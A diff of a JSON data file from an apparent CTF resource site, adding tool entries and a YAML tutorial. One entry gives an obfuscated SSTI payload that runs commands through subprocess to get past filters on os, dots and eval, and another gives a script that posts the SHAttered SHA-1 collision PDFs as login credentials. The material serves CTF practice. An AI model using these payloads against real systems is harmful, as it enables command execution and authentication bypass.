@@ -15,10 +15,10 @@
             "file_path": null,
             "date_added": "2025-04-03T19:28:34.824372",
             "added_by": "Anonymous",
-            "rating": 0,
-            "ratings_count": 0,
-            "views": 2,
-            "description_html": "<h2><strong>Problem:</strong></h2>\n<ul>\n<li>\n<p><code>os</code> module is blocked.</p>\n</li>\n<li>\n<p><code>.</code> (dot) is restricted.</p>\n</li>\n<li>\n<p><code>eval()</code> is blocked.</p>\n</li>\n</ul>\n<h2><strong>Solution:</strong></h2>\n<p>Use <code>subprocess</code> dynamically to execute system commands.</p>\n<h3><strong>Payload:</strong></h3>\n<pre><code class=\"language-python\">getattr(__import__('subprocess'), 'check_output')(\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\n).decode()\n</code></pre>\n<h3><strong>Breakdown:S</strong></h3>\n<ul>\n<li>\n<p><code>__import__('subprocess')</code> \u2192 Dynamically imports <code>subprocess</code>.</p>\n</li>\n<li>\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses <code>check_output</code> without using <code>.</code>.</p>\n</li>\n<li>\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds <code>['cat', '/flag.txt']</code> dynamically.</p>\n</li>\n<li>\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\n</li>\n</ul>\n<h2><strong>Usage:</strong></h2>\n<ul>\n<li>\n<p>Can be used in SSTI scenarios where <code>os</code> is blocked.</p>\n</li>\n<li>\n<p>Works if <code>subprocess</code> is accessible.</p>\n</li>\n<li>\n<p>Helps bypass filters that restrict <code>.</code> or direct function calls.</p>\n</li>\n</ul>\n<p>\u00a0</p>"
+            "rating": 5.0,
+            "ratings_count": 1,
+            "views": 5,
+            "description_html": "<h2><strong>Problem:</strong></h2>\r\n<ul>\r\n<li>\r\n<p><code>os</code> module is blocked.</p>\r\n</li>\r\n<li>\r\n<p><code>.</code> (dot) is restricted.</p>\r\n</li>\r\n<li>\r\n<p><code>eval()</code> is blocked.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Solution:</strong></h2>\r\n<p>Use <code>subprocess</code> dynamically to execute system commands.</p>\r\n<h3><strong>Payload:</strong></h3>\r\n<pre><code class=\"language-python\">getattr(__import__('subprocess'), 'check_output')(\r\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\r\n).decode()\r\n</code></pre>\r\n<h3><strong>Breakdown:S</strong></h3>\r\n<ul>\r\n<li>\r\n<p><code>__import__('subprocess')</code> \u2192 Dynamically imports <code>subprocess</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses <code>check_output</code> without using <code>.</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds <code>['cat', '/flag.txt']</code> dynamically.</p>\r\n</li>\r\n<li>\r\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Usage:</strong></h2>\r\n<ul>\r\n<li>\r\n<p>Can be used in SSTI scenarios where <code>os</code> is blocked.</p>\r\n</li>\r\n<li>\r\n<p>Works if <code>subprocess</code> is accessible.</p>\r\n</li>\r\n<li>\r\n<p>Helps bypass filters that restrict <code>.</code> or direct function calls.</p>\r\n</li>\r\n</ul>\r\n<p>\u00a0</p>"
         },
         {
             "id": 2,
@@ -55,7 +55,7 @@
             "added_by": "Anonymous",
             "rating": 0,
             "ratings_count": 0,
-            "views": 2,
+            "views": 3,
             "description_html": ""
         },
         {
@@ -73,7 +73,7 @@
             "added_by": "Anonymous",
             "rating": 0,
             "ratings_count": 0,
-            "views": 2,
+            "views": 3,
             "description_html": "<p>A Windows SSTV decoder receiving program<br>specially designed for SWL's and HAM's</p>"
         },
         {
@@ -91,8 +91,26 @@
             "added_by": "Anonymous",
             "rating": 0,
             "ratings_count": 0,
-            "views": 2,
-            "description_html": "<h2><strong>Online DTMF Decoders</strong></h2>\n<p><br>Upload the suspicious audio file to online DTMF detection tools:</p>\n<ul>\n<li>DialABC (dialabc.com) analyzes audio recordings and presents statistics, graphs, and tables showing detected DTMF tones and their positions</li>\n<li>The web-based decoder at dtmf.netlify.app allows adjusting sensitivity threshold for better detection</li>\n<li>unframework's DTMF detection demo (unframework.github.io/dtmf-detect) can be used to analyze audio samples</li>\n</ul>\n<h2><strong>Multi-Step Decoding</strong></h2>\n<ul>\n<li>After extracting the DTMF tones (which typically result in a sequence of numbers), players often need to perform additional decoding steps:</li>\n<li>Converting to ASCII/text</li>\n<li>Decoding using T9/Multi-Tap phone keypad cipher</li>\n<li>Converting from BigInteger to strings</li>\n<li>Applying additional ciphers like ROT13 or hexadecimal conversion</li>\n</ul>"
+            "views": 5,
+            "description_html": "<h2><strong>Online DTMF Decoders</strong></h2>\r\n<p><br>Upload the suspicious audio file to online DTMF detection tools:</p>\r\n<ul>\r\n<li>DialABC (dialabc.com) analyzes audio recordings and presents statistics, graphs, and tables showing detected DTMF tones and their positions</li>\r\n<li>The web-based decoder at dtmf.netlify.app allows adjusting sensitivity threshold for better detection</li>\r\n<li>unframework's DTMF detection demo (unframework.github.io/dtmf-detect) can be used to analyze audio samples</li>\r\n</ul>\r\n<h2><strong>Multi-Step Decoding</strong></h2>\r\n<ul>\r\n<li>After extracting the DTMF tones (which typically result in a sequence of numbers), players often need to perform additional decoding steps:</li>\r\n<li>Converting to ASCII/text</li>\r\n<li>Decoding using T9/Multi-Tap phone keypad cipher</li>\r\n<li>Converting from BigInteger to strings</li>\r\n<li>Applying additional ciphers like ROT13 or hexadecimal conversion</li>\r\n</ul>"
+        },
+        {
+            "id": 6,
+            "name": "SHA1 Collision",
+            "category": "crypto",
+            "tags": [
+                "sha1",
+                "sha1 collision"
+            ],
+            "url": "https://shattered.io/",
+            "description": "<p><code>import requests</code><br><code>import sys</code></p>\r\n<p><code>if len(sys.argv) != 2:</code><br><code>\u00a0 \u00a0 print(f\"Usage {sys.argv[0]} &lt;url&gt;\")</code><br><code>\u00a0 \u00a0 exit(1)</code></p>\r\n<p><code>url = sys.argv[1]</code><br><code>pdf1 = \"https://shattered.io/static/shattered-1.pdf\"</code><br><code>pdf2 = \"https://shattered.io/static/shattered-2.pdf\"</code></p>\r\n<p><code>print(\"[*] Getting pdf1 content\")</code><br><code>pdf1_bytes = requests.get(pdf1).content</code><br><code>print(\"[*] Getting pdf2 content\")</code><br><code>pdf2_bytes = requests.get(pdf2).content</code></p>\r\n<p><code>data = {</code><br><code>\u00a0 \u00a0 \"username\": pdf2_bytes,</code><br><code>\u00a0 \u00a0 \"pwd\": pdf1_bytes</code><br><code>}</code></p>\r\n<p><code>res = requests.post(url, data=data)</code><br><code>print(res.text)</code><br><br><br></p>",
+            "file_path": null,
+            "date_added": "2025-04-04T23:28:11.737919",
+            "added_by": "Anonymous",
+            "rating": 0,
+            "ratings_count": 0,
+            "views": 3,
+            "description_html": "<p><code>import requests</code><br><code>import sys</code></p>\r\n<p><code>if len(sys.argv) != 2:</code><br><code>\u00a0 \u00a0 print(f\"Usage {sys.argv[0]} &lt;url&gt;\")</code><br><code>\u00a0 \u00a0 exit(1)</code></p>\r\n<p><code>url = sys.argv[1]</code><br><code>pdf1 = \"https://shattered.io/static/shattered-1.pdf\"</code><br><code>pdf2 = \"https://shattered.io/static/shattered-2.pdf\"</code></p>\r\n<p><code>print(\"[*] Getting pdf1 content\")</code><br><code>pdf1_bytes = requests.get(pdf1).content</code><br><code>print(\"[*] Getting pdf2 content\")</code><br><code>pdf2_bytes = requests.get(pdf2).content</code></p>\r\n<p><code>data = {</code><br><code>\u00a0 \u00a0 \"username\": pdf2_bytes,</code><br><code>\u00a0 \u00a0 \"pwd\": pdf1_bytes</code><br><code>}</code></p>\r\n<p><code>res = requests.post(url, data=data)</code><br><code>print(res.text)</code><br><br><br></p>"
         }
     ],
     "users": [
@@ -145,6 +163,67 @@
             "name": "Miscellaneous",
             "slug": "misc",
             "icon": "fas fa-puzzle-piece"
+        }
+    ],
+    "learning_resources": [
+        {
+            "id": 1,
+            "title": "Introduction to YAML",
+            "description": "<p>Sure! Here's a <strong>well-formatted, meaningful summary</strong> of your video transcript on YAML. I&rsquo;ve organized the content into clear sections and extracted all the <strong>key points</strong> for easy reference:</p>\r\n<hr>\r\n<h2>\ud83d\udd30 Introduction to YAML</h2>\r\n<ul>\r\n<li>\r\n<p><strong>Purpose</strong>: YAML is used to represent data, especially <strong>configuration data</strong>.</p>\r\n</li>\r\n<li>\r\n<p><strong>Why it's important</strong>: The rest of your course depends heavily on YAML, so it&rsquo;s crucial to understand it&mdash;even if you're new to it.</p>\r\n</li>\r\n<li>\r\n<p><strong>Good to know</strong>: If you've worked with XML or JSON, YAML will feel familiar and easier to grasp.</p>\r\n</li>\r\n</ul>\r\n<hr>\r\n<h2>\ud83e\uddf1 YAML vs XML vs JSON</h2>\r\n<ul>\r\n<li>\r\n<p>All three formats are used to structure data.</p>\r\n</li>\r\n<li>\r\n<p>YAML is often simpler and more readable.</p>\r\n</li>\r\n<li>\r\n<p><strong>Example</strong>:</p>\r\n<ul>\r\n<li>\r\n<p>XML: Verbose with opening/closing tags.</p>\r\n</li>\r\n<li>\r\n<p>JSON: Uses curly braces and key-value pairs.</p>\r\n</li>\r\n<li>\r\n<p>YAML: Cleanest, uses indentation and colons.</p>\r\n</li>\r\n</ul>\r\n</li>\r\n</ul>\r\n<hr>\r\n<h2>\ud83d\udd11 YAML Basics</h2>\r\n<h3>1. <strong>Key-Value Pairs</strong></h3>\r\n<pre><code class=\"language-yaml\">fruit: apple\r\nvegetable: carrot\r\nliquid: water\r\nmeat: chicken\r\n</code></pre>\r\n<ul>\r\n<li>\r\n<p><strong>Colon and space</strong> separate key and value.</p>\r\n</li>\r\n<li>\r\n<p>No quotation marks needed for simple strings.</p>\r\n</li>\r\n</ul>\r\n<h3>2. <strong>Arrays (Lists)</strong></h3>\r\n<pre><code class=\"language-yaml\">fruits:\r\n  - apple\r\n  - banana\r\n  - grape\r\n</code></pre>\r\n<ul>\r\n<li>\r\n<p>Use a dash <code>-</code> followed by a space for list items.</p>\r\n</li>\r\n<li>\r\n<p>Indented under the list name (like <code>fruits</code>).</p>\r\n</li>\r\n</ul>\r\n<h3>3. <strong>Dictionaries</strong></h3>\r\n<pre><code class=\"language-yaml\">banana:\r\n  calories: 105\r\n  fat: 0.4\r\n  carbs: 27\r\n</code></pre>\r\n<ul>\r\n<li>\r\n<p>Indentation represents hierarchy.</p>\r\n</li>\r\n<li>\r\n<p>All properties of an item must have the <strong>same indentation</strong>.</p>\r\n</li>\r\n<li>\r\n<p><strong>Incorrect spacing</strong> can lead to YAML errors.</p>\r\n</li>\r\n</ul>\r\n<hr>\r\n<h2>\u26a0\ufe0f Common YAML Error</h2>\r\n<pre><code class=\"language-yaml\">banana:\r\n  calories: 105\r\n    fat: 0.4  # \u274c Incorrect indentation\r\n</code></pre>\r\n<ul>\r\n<li>\r\n<p>If <code>fat</code> and <code>carbs</code> are more indented, they are interpreted as children of <code>calories</code>, which causes a syntax error.</p>\r\n</li>\r\n</ul>\r\n<hr>\r\n<h2>\ud83e\udde9 Nested Structures</h2>\r\n<ul>\r\n<li>\r\n<p><strong>List of Dictionaries</strong>: Common for representing structured data like car details.</p>\r\n</li>\r\n</ul>\r\n<pre><code class=\"language-yaml\">cars:\r\n  - color: red\r\n    model:\r\n      name: Civic\r\n      year: 2022\r\n    transmission: automatic\r\n    price: 22000\r\n  - color: blue\r\n    model:\r\n      name: Corolla\r\n      year: 2023\r\n    transmission: manual\r\n    price: 21000\r\n</code></pre>\r\n<h3>When to Use:</h3>\r\n<ul>\r\n<li>\r\n<p><strong>Dictionary</strong>: For a single object with multiple properties.</p>\r\n</li>\r\n<li>\r\n<p><strong>List</strong>: For multiple values of the same type.</p>\r\n</li>\r\n<li>\r\n<p><strong>List of Dictionaries</strong>: For multiple objects, each with their own properties.</p>\r\n</li>\r\n</ul>\r\n<hr>\r\n<h2>\ud83d\udccc Key Notes &amp; Tips</h2>\r\n<ul>\r\n<li>\r\n<p><strong>Dictionaries</strong> are unordered collections. Order of keys doesn&rsquo;t matter.</p>\r\n</li>\r\n<li>\r\n<p><strong>Lists</strong> are ordered collections. Order matters.</p>\r\n</li>\r\n<li>\r\n<p>Comments start with <code>#</code> and are ignored by the parser.</p>\r\n</li>\r\n</ul>\r\n<pre><code class=\"language-yaml\"># This is a comment\r\n</code></pre>",
+            "url": "",
+            "difficulty": "Beginner",
+            "category_ids": [
+                8
+            ],
+            "date_added": "2025-04-13T12:01:05.707458",
+            "added_by": "Anonymous",
+            "views": 0,
+            "completed_by": 0,
+            "date_updated": "2025-04-13T12:02:21.219309"
+        }
+    ],
+    "learning_categories": [
+        {
+            "id": 1,
+            "name": "Introduction to CTF",
+            "slug": "intro",
+            "icon": "fas fa-flag"
+        },
+        {
+            "id": 2,
+            "name": "Web Security",
+            "slug": "web-security",
+            "icon": "fas fa-spider"
+        },
+        {
+            "id": 3,
+            "name": "Cryptography Basics",
+            "slug": "crypto-basics",
+            "icon": "fas fa-lock"
+        },
+        {
+            "id": 4,
+            "name": "Binary Analysis",
+            "slug": "binary",
+            "icon": "fas fa-microchip"
+        },
+        {
+            "id": 5,
+            "name": "Forensics Techniques",
+            "slug": "forensics-tech",
+            "icon": "fas fa-search"
+        },
+        {
+            "id": 6,
+            "name": "OSINT",
+            "slug": "osint",
+            "icon": "fas fa-eye"
+        },
+        {
+            "id": 8,
+            "name": "Coding",
+            "slug": "coding",
+            "icon": "fa-solid fa-code"
         }
     ]
 }
